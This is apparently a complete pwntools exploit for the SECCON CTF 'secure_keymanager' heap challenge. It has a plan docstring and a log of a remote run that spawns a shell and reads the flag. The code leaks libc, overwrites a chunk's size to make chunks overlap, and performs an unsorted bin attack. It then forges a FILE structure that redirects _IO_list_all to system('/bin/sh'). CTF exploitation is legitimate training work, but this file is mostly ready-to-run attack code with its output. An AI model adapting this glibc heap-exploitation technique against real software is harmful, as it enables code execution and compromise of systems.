'''
		--[[ _IO_list_all Attack ]]==--
	
		Plan:
			- Overflow a chunk's size
			- Overlap with a chunk thanks to musable()
			- Unsorted bin attack
			- _IO_list_all attack

[+] Opening connection to secure_keymanager.pwn.seccon.jp on port 47225: Done
[+] Libc:         0x7f7c9b1d4000
[+] _IO_list_all: 0x7f7c9b599520
[+] system:       0x7f7c9b219390
[*] Switching to interactive mode
$ id
uid=10035 gid=10000(sec_km) groups=10000(sec_km)
$ ls
flag.txt
secure_keymanager
$ cat flag.txt
SECCON{C4n_y0u_b347_h34p_45lr?}
'''
from pwn import *

def reg(name, key):
	r.sendafter('>> ', name)
	r.sendafter('>> ', key)
	return

def alloc(size, title, key):
	r.sendlineafter('>> ', '1')
	r.sendafter('...', str(size))
	r.sendafter('...', title)

	if size > 0:
		r.sendafter('...', key)

	return

def edit(name, key, idx, data):
	r.sendlineafter('>> ', '3')
	reg(name, key)
	r.sendlineafter('...', str(idx))
	r.sendlineafter('...', data)
	return

def free(name, key, idx):
	r.sendlineafter('>> ', '4')
	reg(name, key)
	r.sendlineafter('...', str(idx))
	return

def leak(name):
	r.sendlineafter('>> ', '9')
	r.sendafter('>> ', name)
	r.recvuntil(name)

	return u64(r.recv(6).ljust(8, '\x00')) 

def change(acc, key, data):
	r.sendafter('>> ', '9')
	reg(acc, key)
	r.sendafter('>> ', data)
	return

def pwn():
	vtable = 0x602130 - 0x18
	acc    = "kek"
	key    = "lel"
	reg(acc, key)

	# Leak libc
	libc   = leak('A'*0x18) - 0x3c5620
	iolist = libc + 0x3c5520
	system = libc + 0x45390
	log.success("Libc:         0x{:x}".format(libc))
	log.success("_IO_list_all: 0x{:x}".format(iolist))
	log.success("system:       0x{:x}".format(system))	

	# This is gonna be our victim chunk later on
	alloc(0xa0, 'A'*8, 'A'*8) 
	alloc(0x60, 'B'*8, 'B'*8) 
	# p64(0x31) is there to signify later on to
	# musable() that the current chunk is actually
	# in use
	alloc(0x80, 'C'*8, p64(0x31)*8)

	free(acc, key, 0)

	alloc(-10,  'D'*8, 'D'*8)  
	alloc(0x60, 'E'*8, 'E'*8) 

	# Free fast chunk
	free(acc, key, 0)

	# Get back the same fast chunk & 
	# overwrite next chunk's size field
	alloc(-10,  'F'*0x18 + p32(0x181), 'D'*8)  # 0
	# Set up the vtable for the fake FILE structure
	change(acc+"\x00", key+"\x00", p64(system))

	fstream  = "/bin/sh\x00"
	fstream += p64(0x61)
	fstream += p64(0) 
	# bk => _IO_list_all
	fstream += p64(iolist-0x10)
	fstream += p64(2)
	fstream += p64(3)
	fstream  = fstream.ljust(0x60,"\x00")
	fstream += p64(0) * 3
	fstream += p64(system)
	fstream  = fstream.ljust(0xd8,"\x00")
	fstream += p64(vtable)
	# musable() will use the chunk's size to read in data.
	# Because we have overwritten it with a big enough size
	# the data will overlap the unsorted bin which happens 
	# be right after the currently edited chunk.
	# Unsorted bin attack / _IO_list_all attack
	edit(acc, p64(system), 3, p64(0)*12 + fstream)
	# Trigger abort => _IO_flush_all_lockp => shell
	r.sendlineafter('>> ', '1')
	r.sendlineafter('...', '12')

	r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if sys.argv[1] == "r":
        r = remote('secure_keymanager.pwn.seccon.jp', 47225)
        pwn()
    else:
        r = process('./secure_keymanager')
        pause()
        pwn()
